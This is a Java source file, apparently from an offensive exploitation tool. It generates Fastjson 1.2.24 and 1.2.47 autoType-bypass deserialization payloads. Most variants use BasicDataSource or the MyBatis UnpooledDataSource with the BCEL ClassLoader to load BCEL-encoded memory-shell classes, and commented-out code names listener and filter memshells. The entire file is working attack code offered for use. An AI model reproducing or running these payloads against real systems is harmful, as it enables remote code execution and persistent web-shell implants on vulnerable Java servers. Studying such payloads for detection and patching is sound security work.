package core.payloads;

import core.enumtypes.PayloadType;
import core.utils.MemMap;

public class Fastjson_AutoType_ByPass {

    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        String payloadTemplate = null;
        String bcelString = "";
//        switch (type){
//            case fastjsonlistenermemshell:
//                bcelString = Util.generateBcelCode1(FastJsonListenerMemShell.class);
//                break;
//            case fastjsonfiltermemshell:
//                bcelString = Util.generateBcelCode1(FastJsonFilterMemShell.class);
//                break;
//        }
        bcelString = MemMap.memMap.get("fastjson" + type.toString());
        if (trojanType.toLowerCase().equals("fastjson_1224")){
            payloadTemplate = "{\n" +
                    "    {\n" +
                    "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                    "        \"a\":\n" +
                    "        {\n" +
                    "            \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                    "            \"driverClassLoader\":\n" +
                    "            {\n" +
                    "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "            },\n" +
                    "            \"driverClassName\": \"$$BCEL$$\"\n" +
                    "        }\n" +
                    "    }:\"b\"\n" +
                    "}";
        }
        else if (trojanType.toLowerCase().equals("fastjson_1224_2")) {
            payloadTemplate = "{\n" +
                    "    {\n" +
                    "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                    "        \"a\":\n" +
                    "        {\n" +
                    "            \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                    "            \"driverClassLoader\":\n" +
                    "            {\n" +
                    "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "            },\n" +
                    "            \"driverClassName\": \"$$BCEL$$\"\n" +
                    "        }\n" +
                    "    }:\"b\"\n" +
                    "}";
        }
        else if (trojanType.toLowerCase().equals("fastjson_1224_3")) {
            payloadTemplate = "{\n" +
                    "    \"x\": {\n" +
                    "        {\n" +
                    "            \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                    "            \"a\":{\n" +
                    "                    \"@type\": \"org.apache.commons.dbcp.BasicDataSource\",\n" +
                    "                    \"driverClassLoader\": {\n" +
                    "                        \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "                    },\n" +
                    "                    \"driverClassName\": \"$$BCEL$$\"\n" +
                    "            }\n" +
                    "        }: \"b\"\n" +
                    "    }\n" +
                    "}";
        }
        else if (trojanType.toLowerCase().equals("fastjson_1224_4")) {
            payloadTemplate = "{\n" +
                    "    {\n" +
                    "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                    "        \"a\":\n" +
                    "        {\n" +
                    "            \"@type\": \"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\n" +
                    "            \"driverClassLoader\":\n" +
                    "            {\n" +
                    "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "            },\n" +
                    "            \"driver\": \"$$BCEL$$\"\n" +
                    "        }\n" +
                    "    }:\"b\"\n" +
                    "}";
        }
        else if (trojanType.toLowerCase().equals("fastjson_1247")) {
            payloadTemplate = "{\n" +
                    "    {\n" +
                    "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                    "        \"a\":\n" +
                    "        {\n" +
                    "            \"name\": {\"@type\": \"java.lang.Class\", \"val\": \"org.apache.tomcat.dbcp.dbcp" +
                    ".BasicDataSource\"},\n" +
                    "            \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                    "            \"driverClassLoader\":\n" +
                    "            {\n" +
                    "                \"key\": {\"@type\": \"java.lang.Class\", \"val\": \"com.sun.org.apache.bcel" +
                    ".internal.util.ClassLoader\"},\n" +
                    "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "            },\n" +
                    "            \"driverClassName\": \"$$BCEL$$\"\n" +
                    "        }\n" +
                    "    }:\"b\"\n" +
                    "}";
        }
        else if (trojanType.toLowerCase().equals("fastjson_1247_2")) {
            payloadTemplate = "{\n" +
                    "    {\n" +
                    "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                    "        \"a\":\n" +
                    "        {\n" +
                    "            \"name\": {\"@type\": \"java.lang.Class\", \"val\": \"org.apache.tomcat.dbcp.dbcp2" +
                    ".BasicDataSource\"},\n" +
                    "            \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                    "            \"driverClassLoader\":\n" +
                    "            {\n" +
                    "                \"key\": {\"@type\": \"java.lang.Class\", \"val\": \"com.sun.org.apache.bcel" +
                    ".internal.util.ClassLoader\"},\n" +
                    "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "            },\n" +
                    "            \"driverClassName\": \"$$BCEL$$\"\n" +
                    "        }\n" +
                    "    }:\"b\"\n" +
                    "}";
        }
        else if (trojanType.toLowerCase().equals("fastjson_1247_3")) {
            payloadTemplate = "{\n" +
                    "    \"x\": {\n" +
                    "        {\n" +
                    "            \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                    "            \"a\":{\n" +
                    "                \"name\": {\"@type\": \"java.lang.Class\", \"val\": \"org.apache.commons.dbcp" +
                    ".BasicDataSource\"},\n" +
                    "                \"@type\": \"org.apache.commons.dbcp.BasicDataSource\",\n" +
                    "                \"driverClassLoader\": {\n" +
                    "                    \"key\": {\"@type\": \"java.lang.Class\", \"val\": \"com.sun.org.apache.bcel" +
                    ".internal.util.ClassLoader\"},\n" +
                    "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "                },\n" +
                    "                \"driverClassName\": \"$$BCEL$$\"\n" +
                    "            }\n" +
                    "        }: \"b\"\n" +
                    "    }\n" +
                    "}";
        }

        else if (trojanType.toLowerCase().equals("fastjson_1247_4")) {
            payloadTemplate = "{\n" +
                    "    {\n" +
                    "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                    "        \"a\":\n" +
                    "        {\n" +
                    "            \"name\": {\"@type\": \"java.lang.Class\", \"val\": \"org.apache.ibatis.datasource" +
                    ".unpooled.UnpooledDataSource\"},\n" +
                    "            \"@type\": \"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\n" +
                    "            \"driverClassLoader\":\n" +
                    "            {\n" +
                    "                \"key\": {\"@type\": \"java.lang.Class\", \"val\": \"com.sun.org.apache.bcel" +
                    ".internal.util.ClassLoader\"},\n" +
                    "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "            },\n" +
                    "            \"driver\": \"$$BCEL$$\"\n" +
                    "        }\n" +
                    "    }:\"b\"\n" +
                    "}";
        }
        String payload = payloadTemplate.replace("$$BCEL$$", bcelString);
        return payload;
    }
    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        String payload = (String) getObject(type, trojanType);
        return payload.getBytes();
    }
}
